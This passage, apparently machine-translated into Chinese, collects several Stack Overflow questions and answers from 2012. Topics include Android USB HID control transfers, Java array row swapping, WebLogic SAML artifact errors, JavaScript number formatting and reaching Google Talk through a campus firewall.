一个想法是通过工具[NDepend](http://www.ndepend.com/)运行代码规则（免责声明：我是该工具的开发人员之一）。

*我想做的只是对我使用/触摸的文件运行 CA*

关于第一点，NDepend 让我们通过 LINQ 查询来编写代码规则，并且提出的一个工具是查询当前代码版本与代码的先前版本（基线）之间的[代码差异。](http://www.ndepend.com/Doc_VS_Diff.aspx)因此，用户可以编写代码规则，只关注从现在到基线之间发生的变化。

提出了大约 200 条默认代码规则，例如[避免使复杂方法更加复杂](http://www.ndepend.com/DefaultRules/webframe.html?Q_Avoid_making_complex_methods_even_more_complex_%28Source_CC%29.html)。如果我们看一下这条规则的 LINQ 代码，我们可以看到，它首先只过滤[CodeWasChanged](http://www.ndepend.com/API/webframe.html?NDepend.API~NDepend.CodeModel.ICompareContext~CodeWasChanged.html)所在的方法，然后检测那些足够复杂的方法，然后变得更复杂。方法复杂度在这里通过流行的代码度量[Cyclomatic Complexity](http://www.ndepend.com/API/webframe.html?NDepend.API~NDepend.CodeModel.IMethod~CyclomaticComplexity.html)定义。

```
// <Name>Avoid making complex methods even more complex (Source CC)</Name>

warnif count > 0 
from m in JustMyCode.Methods where
  m.CodeWasChanged() // <-----

let oldCC = m.OlderVersion().CyclomaticComplexity
where oldCC > 6 && m.CyclomaticComplexity > oldCC 

select new { m,
    oldCC ,
    newCC = m.CyclomaticComplexity ,
    oldLoc = m.OlderVersion().NbLinesOfCode,
    newLoc = m.NbLinesOfCode,
} 
```

自基线以来，所有默认或自定义规则都可以调整为仅限于已重构的代码或已引入的代码。代码规则组*[Code Quality Regression](http://www.ndepend.com/DefaultRules/webframe.html)*或*API Breaking Changes*包含这些开箱即用的改编代码规则。

关于这一点，*CA 需要很长时间才能运行，并且警告很多。*您现在可以[尝试 NDepend](http://www.ndepend.com/NDependDownload.aspx)，看看它不会让您等待。分析大型代码库并执行 200 条默认规则（可以轻松自定义，因为它们只是 C# LINQ 查询）需要几秒钟。

# android - 使用 Android 与 USB HID 设备通信

> ID：13280581
> 
> 赞同：18
> 
> 时间：2012-11-08T00:19:38.400
> 
> 标签：android, usb, hid

我是 USB 和 Android 的新手，所以如果我没有清楚地解释自己，请原谅我。

我有一个可以在 Windows 中与之通信的 USB HID 设备。我正在尝试使用运行 Android 3.1 的 Acer Iconia A500 平板电脑建立通信。

我能够找到设备，枚举它，获取其唯一可用的接口，获取唯一可用的端点（0），并确定它是什么类型的端点（从设备传输中断到主机）。

我对 USB 规范的理解是，所有 HID 设备都至少需要有一个控制端点（端点 0）和一个中断 IN 端点。但是这里的端点0似乎是interrupt In端点，而不是控制端点。

然而，为了让设备进行枚举，它必须成功地跨控制端点传输其描述符数据。我推断因此必须找到（并使用）控制端点，因为实际上主机确实枚举了设备。

就我能够继续进行的情况而言，如上所述，在应用程序级别呈现给我的唯一接口/端点是从设备到主机的中断类型。从主机到设备、中断或控制的应用程序没有可用的端点。因此，设备等待被告知要做什么，而主机等待设备中发生某些事情。不是很刺激。

请记住，当连接到 Windows 时，此设备会正确响应，例如，我能够发送包含 13 字节数据的报告，该报告会导致设备点亮 LED。所以它似乎符合 USB HID 规范。作为一种绝望的行为，我尝试使用这个端点作为控制端点和中断 OUT 端点，使用 controltransfer() 和 UsbRequest() 将数据提交给设备，在任何一种情况下都没有响应。

所以我的问题是：“控制传输端点是（？）用于设置设备，为什么我无法找到并使用它？”

感谢您的任何见解，以下是相关代码，如果需要，我可以将其余部分全部包含在内：

```
private UsbManager mUsbManager;
private UsbDevice mDevice;
private UsbDeviceConnection mConnectionRead;
private UsbDeviceConnection mConnectionWrite;
private UsbEndpoint mEndpointRead;
private UsbEndpoint mEndpointWrite;

    // check for existing devices
    for (UsbDevice device :  mUsbManager.getDeviceList().values())
    {
        //Need to filter for my device when other HIDs are also connected, but for now...           
        String devName = device.getDeviceName();
        if (DEBUG == 1){
        Toast.makeText(UsbHidDeviceTesterActivity.this, "My device got connected: " + devName, Toast.LENGTH_LONG).show();
        }
        //mDevice = device;
        setHIDDevice(device);
    }

private boolean setHIDDevice(UsbDevice device)
{    
    UsbInterface usbInterfaceRead = null;
    UsbInterface usbInterfaceWrite = null;
    UsbEndpoint ep1 = null;
    UsbEndpoint ep2 = null;
    boolean UsingSingleInterface = true;

    mDevice = device;

    //This HID device is using a single interface
    if (UsingSingleInterface)
    {
        //usbInterfaceRead = device.getInterface(0x00);//only 1 EP on this interface
        usbInterfaceRead = findInterface(device);

        //Try getting an interface at next index
        //usbInterfaceWrite = device.getInterface(0x01);//throws exception

        // Try using the same interface for reading and writing
        usbInterfaceWrite = usbInterfaceRead;

        int endPointCount = usbInterfaceWrite.getEndpointCount();
        if (DEBUG == 2)
        {
            Toast.makeText(UsbHidDeviceTesterActivity.this, "Endpoints: " + endPointCount, Toast.LENGTH_LONG).show();
            //Toast.makeText(UsbHidDeviceTesterActivity.this, "Interface: " + usbInterfaceRead, Toast.LENGTH_LONG).show();
        }

        if (endPointCount == 1)//only getting 1 endpoint
        {
            ep1 = usbInterfaceRead.getEndpoint(0);
            //As an act of desperation try equating ep2 to this read EP, so that we can later attempt to write to it anyway
            ep2 = usbInterfaceRead.getEndpoint(0);
        }
        else if (endPointCount == 2)
        {
            ep1 = usbInterfaceRead.getEndpoint(0);
            ep2 = usbInterfaceRead.getEndpoint(1);
        }
    }

    else        // ! UsingSingleInterface
    {
        usbInterfaceRead = device.getInterface(0x00);
        usbInterfaceWrite = device.getInterface(0x01);
        if ((usbInterfaceRead.getEndpointCount() == 1) && (usbInterfaceWrite.getEndpointCount() == 1))
        {
            ep1 = usbInterfaceRead.getEndpoint(0);
            ep2 = usbInterfaceWrite.getEndpoint(0);
        }
        if (DEBUG == 3)
        {
            Toast.makeText(UsbHidDeviceTesterActivity.this, "Using Dual Interface", Toast.LENGTH_LONG).show();
        }
    }

    //because ep1 = ep2 this will now not cause a return unless no ep is found at all
    if ((ep1 == null) || (ep2 == null))
    {
        if (DEBUG == 4)
        {
            Toast.makeText(UsbHidDeviceTesterActivity.this, "One EP is null", Toast.LENGTH_LONG).show();
        }
        return false;
    }

    // Determine which endpoint is the read, and which is the write
    if (ep1.getType() == UsbConstants.USB_ENDPOINT_XFER_INT)//I am getting a return of 3, which is an interrupt transfer
    {
        if (ep1.getDirection() == UsbConstants.USB_DIR_IN)//I am getting a return of 128, which is a device-to-host endpoint
        {
            mEndpointRead = ep1;
            if (DEBUG == 5)
            {
                Toast.makeText(UsbHidDeviceTesterActivity.this, "EP1 type: " + ep1.getType(), Toast.LENGTH_LONG).show();
            }
        }
        if (ep1.getDirection() == UsbConstants.USB_DIR_OUT)//nope
        {
            mEndpointWrite = ep1;
            if (DEBUG == 6)
            {
                Toast.makeText(UsbHidDeviceTesterActivity.this, "EP1 is a write", Toast.LENGTH_LONG).show();
            }
        }
    }

    if (ep2.getType() == UsbConstants.USB_ENDPOINT_XFER_INT)
    {
        if (ep2.getDirection() == UsbConstants.USB_DIR_IN)
        {
            //Try treating it as a write anyway             
            //mEndpointRead = ep2;
            mEndpointWrite = ep2;
        }
        else if (ep2.getDirection() == UsbConstants.USB_DIR_OUT)
        {
            //usbEndpointWrite = ep2;
            mEndpointWrite = ep2;
        }
    }

    //check that we should be able to read and write
    if ((mEndpointRead == null) || (mEndpointWrite == null))
    {
        return false;
    }
    if (device != null)
    {
        UsbDeviceConnection connection = mUsbManager.openDevice(device);
        if (connection != null && connection.claimInterface(usbInterfaceRead, true))
        {
            Log.d(TAG, "open SUCCESS");
            mConnectionRead = connection;
            // Start the read thread
            //Comment out while desperately attempting to write on this connection/interface
            //Thread thread = new Thread(this);
            //thread.start();

        }
        else
        {
            Log.d(TAG, "open FAIL");
            mConnectionRead = null;
        }
     }
    if (UsingSingleInterface)
    {
        mConnectionWrite = mConnectionRead;
    }
    else //! UsingSingleInterface
    {
        mConnectionWrite = mUsbManager.openDevice(device);
        mConnectionWrite.claimInterface(usbInterfaceWrite, true);
    }
    return true;
}

// searches for an interface on the given USB device
 private UsbInterface findInterface(UsbDevice device) {
    Log.d(TAG, "findInterface " + device);
    int count = device.getInterfaceCount();
    if (DEBUG == 7)
    {
        Toast.makeText(UsbHidDeviceTesterActivity.this, "Interface count: " + count, Toast.LENGTH_LONG).show();
    }

    for (int i = 0; i < count; i++) {
        UsbInterface intf = device.getInterface(i);
        String InterfaceInfo = intf.toString();
        Log.d(TAG, "Interface: " + InterfaceInfo);
        //Class below is 3 for USB_HID
        if (intf.getInterfaceClass() == 3 && intf.getInterfaceSubclass() == 0 &&
                intf.getInterfaceProtocol() == 0) {
            return intf;
        }
        //....try just returning the interface regardless of class/subclass
        //return intf;
    }

    return null;
} 
 private boolean sendControlTransfer(byte[] dataToSend)
 {
    synchronized (this)
    { 
    if (mConnectionRead != null)
     { 
        //byte[] message = new byte[13];  // or 14?
        byte[] message = dataToSend;
         if (DEBUG == 9)
         {
             Toast.makeText(UsbHidDeviceTesterActivity.this, "Sending Control Transfer", Toast.LENGTH_LONG).show();
         } 

         //first field ox21 is bin 00100001 which splits into 0 01 00001 for direction(1bit)/type(2b)/recipient(5b)
         //To set direction as 'host to Device' we need 0, To set type to HID we need 11 (3), and for recipient we want 00001
         //second field 0x09 is class specific request code, 0x09 is listed as 'reserved for future use'
         //third field 0x200 is value
         //int transfer = mConnectionRead.controlTransfer(0x21, 0x9, 0x200, 0, message, message.length, 0);
         //try with type set to HID
         int transfer = mConnectionRead.controlTransfer(0xC1, 0x9, 0x200, 0, message, message.length, 0);
         if (DEBUG == 10)
         {
             Toast.makeText(UsbHidDeviceTesterActivity.this, "Transfer returned " + transfer, Toast.LENGTH_LONG).show();
         }
     } 
    }
    return true;
 }

private boolean sendInterruptTransfer(byte[] dataToSend)
{ 
    int bufferDataLength = mEndpointWrite.getMaxPacketSize();//The write endpoint is null unless we just copy the read endpoint
    if (DEBUG == 12)
    {
        Toast.makeText(UsbHidDeviceTesterActivity.this, "Max Packet Size: " + bufferDataLength, Toast.LENGTH_LONG).show();
    }

    ByteBuffer buffer = ByteBuffer.allocate(bufferDataLength + 1);
    UsbRequest request = new UsbRequest();
    buffer.put(dataToSend);

    request.initialize(mConnectionWrite, mEndpointWrite);
    request.queue(buffer, bufferDataLength);

    try
    {
        /* only use requestwait on a read
        if (request.equals(mConnectionWrite.requestWait()))
        {
            return true;
        }
        */
    }
    catch (Exception ex)
    {
        // An exception has occurred
        if (DEBUG == 13)
        {
            Toast.makeText(UsbHidDeviceTesterActivity.this, "Caught Write Exception", Toast.LENGTH_LONG).show();
        }
    }

    return true;
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-05T02:27:14.030

所以，我一直在研究类似的东西。我无法确认，但我认为正在发生的是：

1.  Android 在枚举其端点时不会列出控制端点。它仅列出其他端点。
2.  到任何端点的连接都可以通过 controlTransfer 方法将控制传输发送到端点 0，该方法（引用自 api）“在端点 0 上为此设备执行控制事务”。
3.  因此，在您上面的代码中，我将使用第 0 个端点作为中断输入端点，但它仍然允许控制传输。
4.  Missle Launcher 演示就是一个使用 HID 设备的示例，它使用的设备是带有中断端点的 HID 设备。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-11-10T23:26:46.907

您可以使用以下命令获取接口和端点详细信息的完整列表：

```
UsbManager mManager = (UsbManager) getSystemService(Context.USB_SERVICE);
HashMap<String, UsbDevice> deviceList = mManager.getDeviceList();
Iterator<UsbDevice> deviceIterator = deviceList.values().iterator();

while (deviceIterator.hasNext())
    {
        UsbDevice device = deviceIterator.next();
        Log.i(TAG,"Model: " + device.getDeviceName());
        Log.i(TAG,"ID: " + device.getDeviceId());
        Log.i(TAG,"Class: " + device.getDeviceClass());
        Log.i(TAG,"Protocol: " + device.getDeviceProtocol());
        Log.i(TAG,"Vendor ID " + device.getVendorId());
        Log.i(TAG,"Product ID: " + device.getProductId());
        Log.i(TAG,"Interface count: " + device.getInterfaceCount());
        Log.i(TAG,"---------------------------------------");
   // Get interface details
        for (int index = 0; index < device.getInterfaceCount(); index++)
        {
        UsbInterface mUsbInterface = device.getInterface(index);
        Log.i(TAG,"  *****     *****");
        Log.i(TAG,"  Interface index: " + index);
        Log.i(TAG,"  Interface ID: " + mUsbInterface.getId());
        Log.i(TAG,"  Inteface class: " + mUsbInterface.getInterfaceClass());
        Log.i(TAG,"  Interface protocol: " + mUsbInterface.getInterfaceProtocol());
        Log.i(TAG,"  Endpoint count: " + mUsbInterface.getEndpointCount());
    // Get endpoint details 
            for (int epi = 0; epi < mUsbInterface.getEndpointCount(); epi++)
        {
            UsbEndpoint mEndpoint = mUsbInterface.getEndpoint(epi);
            Log.i(TAG,"    ++++   ++++   ++++");
            Log.i(TAG,"    Endpoint index: " + epi);
            Log.i(TAG,"    Attributes: " + mEndpoint.getAttributes());
            Log.i(TAG,"    Direction: " + mEndpoint.getDirection());
            Log.i(TAG,"    Number: " + mEndpoint.getEndpointNumber());
            Log.i(TAG,"    Interval: " + mEndpoint.getInterval());
            Log.i(TAG,"    Packet size: " + mEndpoint.getMaxPacketSize());
            Log.i(TAG,"    Type: " + mEndpoint.getType());
        }
        }
    }
    Log.i(TAG," No more devices connected.");
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-08-25T17:29:28.273

控制传输不显示任何接口描述符，默认情况下其端点编号为 0，用于输入和输出传输。

如果您有其他接口，这些接口的索引应该从 0 开始，即默认控制传输接口不计算在内。

因此，您的接口 0 包含端点 1 描述符。使用 UsbEndpoint 方法查找端点的属性，无论它是否为中断类型。如果是，则 UsbEndpoint.getType() 的端点类型应返回 0x03，UsbEndpoint.getEndpointNumber() 的端点编号应返回 0x81，这是端点 1 的常用值。

你的代码下面是错误的：

```
//first field ox21 is bin 00100001 which splits into 0 01 00001 for direction(1bit)/type(2b)/recipient(5b)
     //To set direction as 'host to Device' we need 0, **To set type to HID we need 11 (3)**, and for recipient we want 00001
     //second field 0x09 is class specific request code, **0x09 is listed as 'reserved for future use'**
     //**third field 0x200 is value**
     //int transfer = mConnectionRead.controlTransfer(0x21, 0x9, 0x200, 0, message, message.length, 0);
     //try with type set to HID
     int transfer = mConnectionRead.controlTransfer(0xC1, 0x9, 0x200, 0, message, message.length, 0); 
```

Type 2 bits 用于表示class specific request，即其值为01，0x09 是Hid class specific request SET_REPORT，不保留。value 是用作 Hid 类的报告 ID 的 wValue，对于您的情况，如果您的 HID 描述符中只有一个报告，则它可能为 0。第 4 个参数是 wIndex，它应该用于指示接收者，对于您的情况，它应该是 0x01 接口作为接收者。

因此，您用于读取或接收数据表单设备的控制传输代码应为：

```
int transfer = mConnectionRead.controlTransfer(0xA1, 0x01, 0x00, 0x01, message, message.length, 0); 
```

其中第二个参数中的 0x01 是 GET_REPORT 是隐藏调用特定请求。

并且您用于向设备写入或发送数据的控制传输代码应该是：

```
int transfer = mConnectionWrite.controlTransfer(0x21, 0x09, 0x00, 0x01, message, message.length, 0); 
```

由于您只有中断 IN 端点 1，因此批量或中断传输应如下所示：

```
int transfer = bulkTransfer (ep1, message, message.length, 0); 
```

要拥有中断输出端点，您的设备固件的接口描述符中应该有一个端点描述符。

# java - 数组交换 - 二维数组

> ID：13280583
> 
> 赞同：4
> 
> 时间：2012-11-08T00:19:44.103
> 
> 标签：java, arrays

我正在研究交换二维数组中的索引。我似乎走在正确的轨道上，但它并没有以我想要的方式交换数组。

第一行的索引`j`需要与第二行的索引交换`j`：

```
for (int j = 0; j < array.length ; j++){  
     int temp = array[row1][j]
     array[row1][j]=array[j][row1]
     array[j][row1] = temp ;
} 
```

任何关于如何最好地解决这个问题的想法都将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:30:09.210

由于java中的二维数组实际上是一个引用其他数组的数组，所以可以简单地交换引用，如下所示：

```
public static void swapRows(int array[][], int rowA, int rowB) {
   int tmpRow[] = array[rowA];
   array[rowA] = array[rowB];
   array[rowB] = tmpRow;
} 
```

**/edit**：编辑了我之前误解的答案**

# vb.net - 如何在我想在 vb.net 中编辑的行之后更改 listview 项的值

> ID：13280588
> 
> 赞同：0
> 
> 时间：2012-11-08T00:20:07.193
> 
> 标签：vb.net, listview, vb.net-2010

[http://s136.beta.photobucket.com/user/dheorwyne/media/Capture.jpg.html](http://s136.beta.photobucket.com/user/dheorwyne/media/Capture.jpg.html)

嗨，这是一个示例工资计划生成日期.. 最后一列表示状态是 CLOSED, OPENED..

我想要的只是在 OPENED 值之后.. 下一行更改为 = "FUTURE ENTRY"

我的想法是先搜索 OPENED 字符串到子项，然后搜索下一行之后的过程。问题是我不知道如何编写这种逻辑。

或者任何简单的方式来做到这一点..

前任：

封闭 开放 未来 进入

像这样的东西..

谢谢你

将项目从数据库填充到 Listview 的示例代码

```
ListView1.Items.Clear()
sqlSTR = "select * from tblpayschedule " & str
ExecuteSQLQuery(sqlSTR)
Dim myRow As DataRow
Dim x As Integer = 0
For Each myRow In sqlDT.Rows
    ListView1.Items.Add(myRow.Item(0))
    ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(myRow.Item(1))
    ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(myRow.Item(2))
    ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(myRow.Item(3))
    ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(myRow.Item(4))
    ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(myRow.Item(5))
    ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(myRow.Item(6))
Next 
```

# memory-management - 如果物理内存的数量大于虚拟内存的数量，虚拟内存是否仍然是一个有用的内存管理方案？

> ID：13280592
> 
> 赞同：0
> 
> 时间：2012-11-08T00:20:41.177
> 
> 标签：memory-management, virtual

在我的作业中被问到这个。

我不知道该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:33:25.300

如果没有虚拟内存，您将无法拥有像`fork`不必在每个任务切换上交换进程那样简单的东西（因为它们将使用相同的物理内存地址）。您也无法存储映射文件或错误加载可执行文件。所以是的，即使不使用虚拟内存来允许比物理内存更多的虚拟内存，虚拟内存仍然很有用。

# android - 重定向 Android 版 Google Talk 的流量

> ID：13280600
> 
> 赞同：9
> 
> 时间：2012-11-08T00:21:53.337
> 
> 标签：android, iptables, google-talk

我知道适用于 Android 的 Google Talk 尝试连接到 mtalk.google.com:5228（或端口 5223 或端口 5222），但是当我连接到大学 Wifi 时，我无法使用 gTalk，因为所有传出连接到端口 5228（等等） ) 被阻止。我也知道可以通过端口 mtalk.google.com:443 访问 Google Talk 服务。[如我错了请纠正我]。

我可以将所有传出流量重定向到 mtalk.google.com:5228 到 mtalk.google.com:443 吗？也许使用应用程序？还是使用iptables？我该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-16T22:03:17.733

希望其他人有解决方案，但似乎浏览器中的 Google Talk 会自动执行此操作（因此，通过 443 提供服务），但 Android 版本仅使用 5228。

[该线程](http://code.google.com/p/miranda/issues/detail?id=120)表明它可能是仅备用方案，因此即使您可以重定向电话上的流量，您也可能会遇到重定向问题。

[此问题](http://code.google.com/p/android/issues/detail?id=10576)再次表明 443 端口仅适用于 Google Talk 的浏览器版本。

最后，虽然它不是绝对可靠的用户，但[这里](http://productforums.google.com/forum/#!topic/talk/J5Z3wluo8fA)对 Android GTalk 完全无法使用端口 443 的可能性提供了更多支持。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-16T22:15:19.480

是的，有很多方法可以做到这一点。也有独立的代理应用程序或提供服务的应用程序。

一种可行的简单解决方案是在 Android 上使用 Orbot：Tor。

另一个与 tor 无关的解决方案[https://play.google.com/store/apps/details?id=com.mgranja.autoproxy_lit](https://play.google.com/store/apps/details?id=com.mgranja.autoproxy_lit)

既然您提到了 Iptables，您也​​可以尝试 ProxyDroid，但您需要一个代理服务器。

BTW.what android 版本你使用的是什么？我认为 gtalk 在最近的版本中转移到了 https。

# javascript - Javascript数字格式到数字

> ID：13280602
> 
> 赞同：-1
> 
> 时间：2012-11-08T00:21:55.617
> 
> 标签：javascript

我需要删除整数的数字格式。

//法语 1 925 => 1925

1.925 => 1925

1,925 => 1925

所以，它基本上是关于删除 thonend 分隔符。数字只是整数......没有小数。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:25:15.950

如果您只想删除所有非数字字符，则：

```
var num = '1,234'.replace(/\D/g, ''); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:24:03.477

```
var str = "1, 925 525",
    reForbidden = /\D+/g;

function formatNum(numStr) {
    return String(numStr).replace(reForbidden, '');
}

alert(formatNum(str));​
​ 
```

小提琴：http: [//jsfiddle.net/f0t0n/5H2G2/](http://jsfiddle.net/f0t0n/5H2G2/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:27:19.220

```
var num = 123.123;

num = parseInt( 
   (""+num).replace(/[^0-9]/g,"")
); 
```

但是，你确定这是你真正想做的吗？1.925 更改为 1925，这是明显不同的数字。如果是您希望 1.925 更改为 2 的情况，则添加一个`Math.round()`调用，如下所示：

```
var num = 123.123;
num = Math.round(num);
num = parseInt( 
   (""+num).replace(/[^0-9]/g,"")
); 
```

# ssl - 缺少工件证书的 Weblogic SAML 1.1 SSO

> ID：13280603
> 
> 赞同：3
> 
> 时间：2012-11-08T00:21:58.597
> 
> 标签：ssl, weblogic, single-sign-on, saml

我正在尝试在运行 Weblogic 10.2 的服务器上设置具有两个域的 SSO 测试环境。我能够成功地在 SAML 源域上的示例 servlet 上使用登录名，并通过指向 SAML 目标域上的 servlet 的链接进行连接。这是使用带有浏览器/POST 依赖方的 SAML 1.1，因为这是在 Oracle 文档中提供了两个域的示例，使用了一个虚拟的 appA 和 appB。（我没有方便的示例说明链接，但效果很好）

然而，我的目标是使用浏览器/工件场景测试 SAML 1.1。所以我使用了相同的安全领域，并为目标域设置了一个新的 AP，为源域设置了一个新的 RP（请记住，它们都在同一台机器上运行）。我使用了相同的 SSL 信息和密钥库/信任库/别名（实际上它们都使用具有别名“localhost”的相同自签名证书）。它在目标应用程序上失败并出现 403 错误。我可以看到字符串中生成的工件：

```
https://localhost:7012/samlacs/acs?APID=ap_00002&SAMLart=AAH9R8ftHOp8ZwdBGik0ijXWFCYQZuUL%2FwTHd8JU%2Fo3aOkNGzkqbtuBm&TARGET=http://localhost:7010/appB/admin/services.jsp 
```

但是断言查找中有一个错误（或者在工件取消引用之前）：（工件与日志不匹配，因为我再次运行它）（源域）：

```
Kernel>> <> <> <1352329499359> <BEA-000000> <SAMLSourceSite: lookupStoredAssertions:         fetching assertion for artifact 'AAH9R8ftHOp8ZwdBGik0ijXWFCYQZoF3demE97Ls8pVqYxvva+3Mka/9'> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySAMLService> <blah> <AdminServer>     <[ACTIVE] ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS     Kernel>> <> <> <1352329499359> <BEA-000000> <SAMLSourceSite: verifyDestinationSite: auth     failure for partner 'rp_00002', client cert required but not provided> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySAMLService> <blah> <AdminServer>       <[ACTIVE] ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS   Kernel>> <> <> <1352329499359> <BEA-000000> <SAMLSourceSite: lookupStoredASsertions: auth   failure: missing/invalid credentials for partner 'rp_00002'> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySAMLService> <blah> <AdminServer>        <[ACTIVE] ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS    Kernel>> <> <> <1352329499359> <BEA-000000> <SAMLSourceSite: dispatchAssertionRequest:   destination site auth failure, returning FORBIDDEN> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <Http> <blah> <AdminServer> <[ACTIVE]   ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<anonymous>> <> <>    <1352329499359> <BEA-000000> <HttpRequest@20065100 - /samlars/ars: Writing headers for   HttpRequest@20065100 - /samlars/ars> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySSL> <blah> <AdminServer> <[ACTIVE] ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1352329499359> <BEA-000000> <write APPLICATION_DATA, offset = 0, length = 160> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <Http> <blah> <AdminServer> <[ACTIVE]  ExecuteThread: '1' for queue: 'weblogic.kernel.Default (self-tuning)'> <<anonymous>> <> <>   <1352329499359> <BEA-000000> <Response committed. request: 'HttpRequest@20065100 -  /samlars/ars' response: weblogic.servlet.internal.ServletResponseImpl@ea013e[
HTTP/1.1 403 Forbidden
Date: : Wed, 07 Nov 2012 23:04:59 GMT
Content-Length: : 1216
Content-Type: : text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
]> 
```

（目标域）：

```
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySAMLService> <blah> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1352329499359> <BEA-000000> <SAMLDestinationSiteHelper: Exception while sending/receiving request/response: org.opensaml.SAMLException: SAMLSOAPBinding.send(): Error response from server: '403 Forbidden'> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySAMLService> <blah> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1352329499359> <BEA-000000> <SAMLDestinationSiteHelper: Unable to dereference artifact -- returning SC_FORBIDDEN> 
###<Nov 7, 2012 5:04:59 PM CST> <Debug> <Http> <blah> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<anonymous>> <> <> <1352329499359> <BEA-000000> <HttpRequest@6557952 - /samlacs/acs: Writing headers for HttpRequest@6557952 - /samlacs/acs> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <Http> <blah> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<anonymous>> <> <> <1352329499359> <BEA-000000> <HttpRequest@6557952 - /samlacs/acs: Wrote cookie: JSESSIONID=bkLSQhphfgFQGRnZNprd2kHJ71GGyPjsF91TMsn4pKkTMgLxcxVr!-98623638; path=/; HttpOnly> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <SecuritySSL> <7PSS2Q1> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1352329499359> <BEA-000000> <write APPLICATION_DATA, offset = 0, length = 250> 
####<Nov 7, 2012 5:04:59 PM CST> <Debug> <Http> <blah> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<anonymous>> <> <>   <1352329499359> <BEA-000000> <Response committed. request: 'HttpRequest@6557952 -  /samlacs/acs' response: weblogic.servlet.internal.ServletResponseImpl@2c3cd3[
HTTP/1.1 403 Forbidden
Date: : Wed, 07 Nov 2012 23:04:58 GMT
Content-Length: : 1216
Content-Type: : text/html
Set-Cookie: JSESSIONID=bkLSQhphfgFQGRnZNprd2kHJ71GGyPjsF91TMsn4pKkTMgLxcxVr!-98623638;  path=/; HttpOnly
X-Powered-By: Servlet/2.5 JSP/2.1
]> 
```

我看不到任何其他地方可以在依赖方或断言方中附加这个丢失的客户端证书。有谁知道可能是什么问题？

# youtube - 从 liveleak 获取 img 缩略图？

> ID：13280605
> 
> 赞同：2
> 
> 时间：2012-11-08T00:22:15.020
> 
> 标签：youtube, thumbnails

我想从 liveleak.com 获取视频的缩略图。

从 Youtube 获取图像时，我只是这样做：

[http://img.youtube.com/vi/HwP5NG-3e8I/2.jpg](http://img.youtube.com/vi/HwP5NG-3e8I/2.jpg)

知道如何为 liveleak.com 做些什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T13:02:24.573

不幸的是，似乎没有像 youtube 那样容易标准化的 URL，但是如果您可以调用视频页面，则可以相当容易地刮出图像。`<script>`页面上有一个调用`jwplayer`函数的标签。此函数使用具有`image`属性的对象进行初始化。您可以将此值用作缩略图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-19T16:29:02.173

它仍然需要抓取页面，但标题中的 meta og:image 标签也指向缩略图。

# android - android：仅在 Honeycomb 3.2 上的通知崩溃

> ID：13280613
> 
> 赞同：1
> 
> 时间：2012-11-08T00:23:02.557
> 
> 标签：android, notifications, android-3.0-honeycomb

显示通知时出现崩溃，但仅在蜂窝 3.2 上。

这是一个已知问题：[http ://code.google.com/p/android/issues/detail?id=36502](http://code.google.com/p/android/issues/detail?id=36502)

我尝试使用不同版本的 compat 库，但缺少很多功能，这似乎不是一个好的解决方案。

除了不显示 3.x 的通知外，还有其他已知的解决方法吗？

堆栈跟踪：

```
java.lang.NoSuchMethodError: android.app.Notification$Builder.setProgress 在
android.support.v4.app.NotificationCompatIceCreamSandwich.add(NotificationCompatIceCreamSandwich.java:31) 在
android.support.v4.app.NotificationCompat$NotificationCompatImplIceCreamSandwich.build(NotificationCompat.java:104) 在
android.support.v4.app.NotificationCompat$Builder.build(NotificationCompat.java:558) 在
我的代码在这里

```

# android - 在 android mediacontroller 中更改文本的颜色

> ID：13280614
> 
> 赞同：4
> 
> 时间：2012-11-08T00:23:07.657
> 
> 标签：android, android-mediaplayer, mediacontroller

